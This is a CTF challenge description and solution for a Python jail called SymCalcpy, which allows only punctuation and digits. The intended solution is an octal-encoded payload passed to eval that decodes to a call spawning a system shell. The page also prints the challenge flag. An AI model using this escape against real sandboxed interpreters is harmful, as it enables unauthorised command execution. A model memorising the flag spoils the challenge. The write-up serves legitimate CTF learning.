# SymCalcpy
## JAIL - Medium
| author | first blood | solves | points |
| --- | --- | --- | --- |
| k3v1n | _ | 0 | 0 |
### prompt
Welcome to SymCalc, the most secure calculator ever. Only punctuation and digits allowed!

**Connect via:**
`nc symcalc.sdc.tf 1337`

### original specification
Allowed set of characters written in Python:
`set(string.punctuation + string.digits + '\n')`

It also asks for a favorite builtin, which will be pushed to a Python interpreter, the interpreter then asks for you to enter an expression.
The trick is to enter eval for that and then enter Python code encoded in octal digits:
`_('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\163\171\163\164\145\155\050\042\163\150\042\051')`

There is actually another built-in (without using the obvious eval or exec) that can be used: `getattr`, with a more complex exploit based on the same octal encoding idea, but this will be left as an exercise to the writeup authors.

**flag:** `sdctf{0ct4l_3scap3s_go_brrrrr...___und3rsc0r3s_ar3_Id3Nt1Fi3rs_t00}`

